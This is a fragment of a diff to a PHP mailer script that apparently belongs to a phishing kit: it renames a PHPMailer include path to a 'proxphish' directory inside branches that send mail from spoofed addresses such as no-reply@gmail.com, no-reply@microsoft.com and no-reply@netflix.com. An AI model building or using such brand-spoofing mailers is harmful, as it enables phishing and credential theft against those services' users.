@@ -180,7 +180,7 @@ transform: scale(2);
         {
           //$link = str_replace(".com_pc","",$str_link2);
           //$link =   "no-reply" ."@" .$link .".com";
-      require "/var/www/proxior/mail/PHPMailerAutoload.php";
+      require "/var/www/proxphish/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 
 $mail->CharSet = 'UTF-8';
@@ -235,7 +235,7 @@ $mail->AddAddress("$email");
 
  else if ($link == 'no-reply@instagram.com')
         {
-     require "/var/www/proxior/mail/PHPMailerAutoload.php";
+     require "/var/www/proxphish/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 
 $mail->CharSet = 'UTF-8';
@@ -291,7 +291,7 @@ $mail->AddAddress("$email");
 
 else if ($link == 'no-reply@twitter.com')
         {
-      require "/var/www/proxior/mail/PHPMailerAutoload.php";
+      require "/var/www/proxphish/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 
 $mail->CharSet = 'UTF-8';
@@ -347,7 +347,7 @@ $mail->AddAddress("$email");
 
 else if ($link == 'no-reply@gmail.com')
         {
-      require "/var/www/proxior/mail/PHPMailerAutoload.php";
+      require "/var/www/proxphish/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 
 $mail->CharSet = 'UTF-8';
@@ -404,7 +404,7 @@ else if ($link == 'no-reply@https://login.live.com')
           $str_link2 = str_replace("https://","",$str_link);
           $str_link3 = str_replace(".com","",$str_link2);
           $link =   "no-reply" ."@" .$str_link3 .".com";
-      require "/var/www/proxior/mail/PHPMailerAutoload.php";
+      require "/var/www/proxphish/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 
 $mail->CharSet = 'UTF-8';
@@ -458,7 +458,7 @@ $mail->AddAddress("$email");
 
 else if ($link == 'no-reply@yahoo.com')
         {
-      require "/var/www/proxior/mail/PHPMailerAutoload.php";
+      require "/var/www/proxphish/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 
 $mail->CharSet = 'UTF-8';
@@ -514,7 +514,7 @@ $mail->AddAddress("$email");
 
 else if ($link == 'no-reply@microsoft.com')
         {
-      require "/var/www/proxior/mail/PHPMailerAutoload.php";
+      require "/var/www/proxphish/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 
 $mail->CharSet = 'UTF-8';
@@ -570,7 +570,7 @@ $mail->AddAddress("$email");
 
 else if ($link == 'no-reply@adobe.com')
         {
-      require "/var/www/proxior/mail/PHPMailerAutoload.php";
+      require "/var/www/proxphish/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 
 $mail->CharSet = 'UTF-8';
@@ -626,7 +626,7 @@ $mail->AddAddress("$email");
 
 else if ($link == 'no-reply@linkedin.com')
         {
-      require "/var/www/proxior/mail/PHPMailerAutoload.php";
+      require "/var/www/proxphish/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 
 $mail->CharSet = 'UTF-8';
@@ -682,7 +682,7 @@ $mail->AddAddress("$email");
 
 else if ($link == 'no-reply@messenger.com')
         {
-      require "/var/www/proxior/mail/PHPMailerAutoload.php";
+      require "/var/www/proxphish/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 
 $mail->CharSet = 'UTF-8';
@@ -738,7 +738,7 @@ $mail->AddAddress("$email");
 
 else if ($link == 'no-reply@netflix.com')
         {
-      require "/var/www/proxior/mail/PHPMailerAutoload.php";
+      require "/var/www/proxphish/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 
 $mail->CharSet = 'UTF-8';
@@ -793,7 +793,7 @@ $mail->AddAddress("$email");
 
 else 
   {
-   require "/var/www/proxior/mail/PHPMailerAutoload.php";
+   require "/var/www/proxphish/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
 
 $mail->CharSet = 'UTF-8';
